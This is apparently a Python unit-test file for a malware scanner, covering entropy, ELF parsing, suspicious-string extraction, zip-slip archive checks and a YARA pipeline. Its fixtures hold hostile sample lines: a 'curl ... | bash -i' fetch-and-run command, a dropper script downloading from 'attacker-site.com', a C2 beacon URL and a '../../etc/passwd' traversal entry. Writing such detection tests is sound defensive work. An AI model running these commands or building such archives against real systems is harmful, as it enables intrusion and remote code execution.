"""Unit tests for multi-stage analysis pipeline and static analyzers."""

import io
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

from malware_scanner.pipeline import (
    AnalysisPipeline,
    calculate_entropy,
    extract_suspicious_strings,
    inspect_archive,
    inspect_elf,
)


class PipelineTests(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.root = Path(self.tmpdir.name)
        # Create minimal YARA rules directory
        self.rules_dir = self.root / "rules"
        self.rules_dir.mkdir(parents=True, exist_ok=True)
        (self.rules_dir / "test.yar").write_text(
            'rule test_beacon {\n  strings:\n    $s = "MALICIOUS_C2_TOKEN"\n  condition:\n    $s\n}\n',
            encoding="utf-8"
        )
        self.pipeline = AnalysisPipeline(rules_dir=str(self.rules_dir))

    def tearDown(self):
        self.tmpdir.cleanup()

    def test_calculate_entropy(self):
        # Uniform bytes have low entropy
        self.assertEqual(calculate_entropy(b""), 0.0)
        self.assertEqual(calculate_entropy(b"A" * 100), 0.0)

        # High entropy random-like byte sequence
        high_entropy_bytes = bytes(range(256)) * 4
        entropy = calculate_entropy(high_entropy_bytes)
        self.assertGreater(entropy, 7.9)

    def test_inspect_elf(self):
        # Fake 64-bit little endian ELF header
        # \x7fELF, class=2, data=1, version=1, abi=0, padding=8 bytes, type=2 (ET_EXEC), machine=62 (x86_64)
        elf_header = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00\x3e\x00" + b"\x00" * 36
        info = inspect_elf(elf_header)
        self.assertIsNotNone(info)
        self.assertEqual(info["format"], "ELF")
        self.assertEqual(info["class"], "64-bit")
        self.assertEqual(info["endian"], "little")
        self.assertEqual(info["type"], "ET_EXEC")
        self.assertEqual(info["machine"], "x86_64")

        # Non-ELF returns None
        self.assertIsNone(inspect_elf(b"MZ\x90\x00\x03\x00"))

    def test_extract_suspicious_strings(self):
        content = (
            b"curl -s http://192.168.1.50/payload.sh | bash -i\n"
            b"Connect to https://evil-c2.org:8443/beacon\n"
            b"Normal harmless string content here.\n"
        )
        findings = extract_suspicious_strings(content)
        types = [f["type"] for f in findings]
        values = [f["value"] for f in findings]

        self.assertIn("ipv4", types)
        self.assertIn("192.168.1.50", values)
        self.assertIn("url", types)
        self.assertTrue(any("evil-c2.org" in v for v in values))
        self.assertIn("suspicious_command", types)
        self.assertTrue(any("curl" in v or "bash" in v for v in values))

    def test_inspect_archive_zip_slip_risk(self):
        # Create a ZIP file with path traversal entry
        zip_path = self.root / "malicious.zip"
        with zipfile.ZipFile(zip_path, "w") as zf:
            zf.writestr("../../etc/passwd", "root:x:0:0:::")
            zf.writestr("normal.txt", "hello world")

        info = inspect_archive(str(zip_path))
        self.assertIsNotNone(info)
        self.assertEqual(info["format"], "ZIP")
        self.assertTrue(info["has_path_traversal_risk"])
        self.assertEqual(info["total_entries"], 2)

    def test_inspect_archive_tar_safety(self):
        tar_path = self.root / "sample.tar"
        with tarfile.open(tar_path, "w") as tf:
            data = b"harmless content"
            ti = tarfile.TarInfo("safe.txt")
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))

        info = inspect_archive(str(tar_path))
        self.assertIsNotNone(info)
        self.assertEqual(info["format"], "TAR")
        self.assertFalse(info["has_path_traversal_risk"])

    def test_pipeline_multistage_analysis(self):
        # Create a file that triggers YARA match and suspicious strings
        target_file = self.root / "dropper.sh"
        target_file.write_bytes(
            b"#!/bin/bash\n"
            b"# MALICIOUS_C2_TOKEN\n"
            b"curl -O https://attacker-site.com/binary\n"
            b"chmod +x binary\n"
        )

        res = self.pipeline.analyze(str(target_file))
        self.assertEqual(res["file_name"], "dropper.sh")
        self.assertEqual(res["automated_assessment"], "suspicious")
        self.assertEqual(res["severity"], "high")
        self.assertEqual(res["yara_count"], 1)
        self.assertEqual(res["yara_matches"][0]["rule"], "test_beacon")
        self.assertGreater(len(res["observed_evidence"]), 0)


if __name__ == "__main__":
    unittest.main()
